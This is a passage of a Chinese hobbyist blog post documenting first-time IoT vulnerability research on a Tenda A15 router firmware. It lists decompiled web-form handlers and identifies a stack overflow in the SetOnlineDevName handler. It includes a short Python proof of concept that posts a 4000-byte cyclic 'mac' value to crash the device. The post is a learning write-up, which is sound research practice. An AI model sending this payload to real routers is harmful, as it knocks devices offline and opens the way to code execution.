websFormDefine(<span class="string">&quot;getDeviceInfo&quot;</span>, formGetDeviceInfo);</span><br><span class="line">  websFormDefine(<span class="string">&quot;telnet&quot;</span>, TendaTelnet);</span><br><span class="line">  websFormDefine(<span class="string">&quot;SysToolReboot&quot;</span>, fromSysToolReboot);</span><br><span class="line">  websFormDefine(<span class="string">&quot;SysToolRestoreSet&quot;</span>, fromSysToolRestoreSet);</span><br><span class="line">  websFormDefine(<span class="string">&quot;SysToolChangePwd&quot;</span>, fromSysToolChangePwd);</span><br><span class="line">  websFormDefine(<span class="string">&quot;SysToolSetUpgrade&quot;</span>, fromSysToolSetUpgrade);</span><br><span class="line">  websFormDefine(<span class="string">&quot;WifiBasicGet&quot;</span>, formWifiBasicGet);</span><br><span class="line">  websFormDefine(<span class="string">&quot;WifiBasicSet&quot;</span>, formWifiBasicSet);</span><br><span class="line">  websFormDefine(<span class="string">&quot;WifiApScan&quot;</span>, formWifiApScan);</span><br><span class="line">  websFormDefine(<span class="string">&quot;ate&quot;</span>, TendaAte);</span><br><span class="line">  websFormDefine(<span class="string">&quot;setApModeCfg&quot;</span>, fromsetApModeCfg);</span><br><span class="line">  websFormDefine(<span class="string">&quot;getApModeCfg&quot;</span>, fromgetApModeCfg);</span><br><span class="line">  websFormDefine(<span class="string">&quot;WifiExtraSet&quot;</span>, fromSetWirelessRepeat);</span><br><span class="line">  websFormDefine(<span class="string">&quot;getQuicksetBridge&quot;</span>, fromGetWirelessRepeat);</span><br><span class="line">  websFormDefine(<span class="string">&quot;getStatusBeforeBridge&quot;</span>, fromGetWirelessRepeat);</span><br><span class="line">  websFormDefine(<span class="string">&quot;exit&quot;</span>, formExit);</span><br><span class="line">  websFormDefine(<span class="string">&quot;hasLoginPwd&quot;</span>, formhasLoginPwd);</span><br><span class="line">  websFormDefine(<span class="string">&quot;loginOut&quot;</span>, fromLoginOut);</span><br><span class="line">  websFormDefine(<span class="string">&quot;sysToolsInfo&quot;</span>, fromSysToolsInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大佬说关注set之类的函数，和数据读写有关，可能存在栈溢出这种漏洞</p>
+<p>分析处理<code>SetOnlineDevName</code> 请求的<code>formSetDeviceName</code> 函数，其中的<code>set_device_name</code>发现漏洞</p>
+<p>在常规 Pwn 题里，接收输入的是 <code>read(0, buf, size)</code> 或者 <code>gets(buf)</code>，直接从标准输入流读。</p>
+<p>而在 Tenda 路由器的 <code>formSetDeviceName</code> 函数里，它绝对不会调用 <code>scanf</code> 或 <code>read</code> 等待你输入。<code>websFormHandler</code> 会把 HTTP POST 请求全部接收完毕，并解析成了内存里的一个字典结构</p>
+<p>这是大佬给的POC：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> cyclic</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;192.168.0.1&#x27;</span> <span class="comment"># 填网桥 IP</span></span><br><span class="line">url =  <span class="string">f&#x27;http://<span class="subst">&#123;ip&#125;</span>/goform/SetOnlineDevName&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结合优势：攻击 mac 字段，并使用 4000 字节的超大探针！</span></span><br><span class="line">payload = &#123;</span><br><span class="line">  <span class="string">&quot;mac&quot;</span>: cyclic(<span class="number">4000</span>), </span><br><span class="line">  <span class="string">&quot;devName&quot;</span>: <span class="string">&quot;devname1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 正在发送 4000 字节的终极探针...&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.post(url=url , data=payload, timeout=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 目标已彻底断开，绝对当场暴毙！&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果失败，需要patch一下程序的某个字节</p>
+<p>看大佬博客，是在下图抛出错误的</p>
+<p><img src="image-20260415204813384.png" alt="image-20260415204813384"></p>
+<p>需要nop掉灰色方框的语句</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://wlmt666.top">胡楚昊</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://wlmt666.top/2026/04/13/IOT%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E4%BD%93%E9%AA%8C-Tenda-A15/">https://wlmt666.top/2026/04/13/IOT%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E4%BD%93%E9%AA%8C-Tenda-A15/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://wlmt666.top" target="_blank">wlmt666的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="../../../../tags/iot/">iot</a></div><div class="post-share"><div class="social-share" data-image="../../../../img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="../../../03/28/APP-%E6%B5%81%E9%87%8F%E5%AE%89%E5%85%A8%E4%B8%8E%E5%8D%8F%E8%AE%AE%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8C-BinLab/" title="APP 流量安全与协议逆向工程实验 BinLab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">APP 流量安全与协议逆向工程实验 BinLab</div></div><div class="info-2"><div class="info-item-1">这是OnePanda战队的程序元师傅发给我的一套靶场，实操下来感觉很有趣，因此在这里复现一手 靶场连接：BinLab - 二进制磨剑实验平台 实验 0: 现代流量安全的基石——证书实验前置知识123456789101112131. 证书层级结构根 CA (Root CA)  ├── 中间 CA (Intermediate CA) [可选]  └── 服务器证书 (Server Certificate)根 CA：自签名，被操作系统/浏览器信任服务器证书：由 CA 签发，用于标识网站身份2. X.509 证书关键字段Subject (主题)：证书所有者信息Issuer (颁发者)：签发此证书的 CAValidity (有效期)：Not Before 和 Not AfterSubject Alternative Name (SAN)：支持的域名列表Basic Constraints：CA:TRUE 表示这是 CA 证书Key...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="../../../03/08/Polar-IOT%E5%AE%89%E5%85%A8%E5%88%B7%E9%A2%98-%E4%B8%8A/" title="polar IOT安全 简单难度"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-08</div><div class="info-item-2">polar IOT安全 简单难度</div></div><div class="info-2"><div class="info-item-1">a few参考的是：PolarD&amp;N PIoTS 简单 - v1c0 - 博客园 bluetooth test 小游家里的智能灯泡家具总是在自己没有控制的时候开开关关，他怀疑是有人控制自己的灯泡进行重放。现在我们获得了一个控制灯泡重放的蓝牙hcl文件，请使用FrontLine11工具找出控制关闭灯泡指令的第一组data文件，将其进行md5加密。工具版本：CPAS-11(Frontline_16.10.12321.12610).exe  这里尝试用wireshark做，解析不出，所以使用题目推荐的工具做 打开log文件，可以看到解析的非常详细  我们着重观看command指令，右键type栏，选择过滤即可过滤出只含command的栏目。我们观看size，一般来说size不会太大，但是前面有的四五个大小的应该不是，这里着重先看看十几的 询问AI得知：  控制指令的核心逻辑是固定的（比如 “关灯” 就是固定的二进制模板）。为了防止重放攻击（恶意重复发送旧指令），协议里会加一个自增计数器 &#x2F; 序列号，每次操作 +...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="../img/butterfly-icon.png" onerror="this.onerror=null;this.src='../img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">胡楚昊</div><div class="author-info-description">热爱网安的菜鸟一枚</div><div class="site-data"><a href="../archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="../tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="../categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/wlmt666"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">热爱网安的菜鸟一枚</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8C%85%E4%B8%8E%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F"><span class="toc-number">2.</span> <span class="toc-text">固件解包与环境模拟</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../2026/04/13/IOT%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E4%BD%93%E9%AA%8C-Tenda-A15/" title="IOT漏洞挖掘初体验-Tenda A15">IOT漏洞挖掘初体验-Tenda A15</a><time datetime="2026-04-13T13:47:04.000Z" title="发表于 2026-04-13 21:47:04">2026-04-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../2026/03/28/APP-%E6%B5%81%E9%87%8F%E5%AE%89%E5%85%A8%E4%B8%8E%E5%8D%8F%E8%AE%AE%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8C-BinLab/" title="APP 流量安全与协议逆向工程实验 BinLab">APP 流量安全与协议逆向工程实验 BinLab</a><time datetime="2026-03-28T09:15:29.000Z" title="发表于 2026-03-28 17:15:29">2026-03-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../2026/03/18/2025%E6%B5%99%E6%B1%9F%E7%9C%81%E5%86%B3%E8%B5%9Bre%E5%A4%8D%E7%8E%B0/" title="2025浙江省决赛re复现">2025浙江省决赛re复现</a><time datetime="2026-03-18T12:37:54.000Z" title="发表于 2026-03-18 20:37:54">2026-03-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../2026/03/08/Polar-IOT%E5%AE%89%E5%85%A8%E5%88%B7%E9%A2%98-%E4%B8%8A/" title="polar IOT安全 简单难度">polar IOT安全 简单难度</a><time datetime="2026-03-08T09:58:57.000Z" title="发表于 2026-03-08 17:58:57">2026-03-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../2026/03/04/wasm%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/" title="wasm逆向初探">wasm逆向初探</a><time datetime="2026-03-04T09:14:24.000Z" title="发表于 2026-03-04 17:14:24">2026-03-04</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2025 - 2026 By 胡楚昊</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="../../../../js/utils.js"></script><script src="../../../../js/main.js"></script><div class="js-pjax"></div><script type="text/javascript" src="/js/wlmt666.js"></script><script type="text/javascript" src="/js/sakura.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
